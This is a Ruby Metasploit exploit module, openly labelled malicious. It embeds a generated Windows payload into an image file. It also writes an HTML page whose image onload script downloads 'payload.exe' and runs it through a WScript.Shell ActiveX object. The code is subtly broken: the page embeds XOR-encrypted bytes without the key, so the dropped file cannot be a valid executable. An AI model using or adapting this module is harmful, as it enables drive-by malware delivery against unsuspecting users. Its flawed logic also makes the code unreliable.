# frozen_string_literal: true

# module.rb
require 'msf/core'
require 'securerandom'
require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Advanced Image Payload Embedder',
                      # rubocop:todo Layout/LineLength
                      'Description' => 'This module embeds a payload into an image file and generates a malicious HTML file.',
                      # rubocop:enable Layout/LineLength
                      'Author' => ['Your Name'],
                      'License' => MSF_LICENSE,
                      'Platform' => 'win',
                      'Targets' => [['Windows', {}]],
                      'DefaultTarget' => 0,
                      'Payload' => {
                        'DisableNops' => true
                      }))

    register_options([
                       OptString.new('IMAGE_PATH', [true, 'Path to the image file']),
                       OptString.new('OUTPUT_PATH', [true, 'Path to save the malicious HTML file'])
                     ])
  end

  def generate_random_key(length)
    SecureRandom.random_bytes(length)
  end

  def xor_encrypt(payload, key)
    key_bytes = key.bytes.cycle
    payload.bytes.zip(key_bytes).map { |payload_byte, key_byte| payload_byte ^ key_byte }.pack('C*')
  end

  def embed_payload_into_image(image_path, payload)
    image_data = File.binread(image_path)
    zip_data = Rex::Zip::Archive.new
    zip_data.add_file('payload.bin', payload)
    zip_data.add_file('image.jpg', image_data)
    zip_data.pack
  end

  def generate_malicious_html(image_path, payload_bytes)
    payload_array = payload_bytes.unpack('C*')
    <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
        <title>Malicious Image</title>
      </head>
      <body>
        <img src="#{image_path}" alt="Malicious Image" onload="executePayload()">
        <script>
          function executePayload() {
            var payload = new Uint8Array(#{payload_array});

            var blob = new Blob([payload], { type: 'application/octet-stream' });
            var url = URL.createObjectURL(blob);

            var a = document.createElement('a');
            a.href = url;
            a.download = 'payload.exe';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            setTimeout(function() {
              var exec = new ActiveXObject('WScript.Shell').Run('payload.exe');
            }, 1000);
          }
        </script>
      </body>
      </html>
    HTML
  end

  def exploit
    image_path = datastore['IMAGE_PATH']
    output_path = datastore['OUTPUT_PATH']

    payload_data = generate_payload_exe
    key = generate_random_key(16)
    encrypted_payload = xor_encrypt(payload_data, key)

    embedded_data = embed_payload_into_image(image_path, encrypted_payload)
    File.binwrite(image_path, embedded_data)
    print_good("Payload successfully embedded into #{image_path}")

    malicious_html = generate_malicious_html(image_path, encrypted_payload)
    File.write(output_path, malicious_html)
    print_good("Malicious HTML file generated at #{output_path}")

    super
  end
end
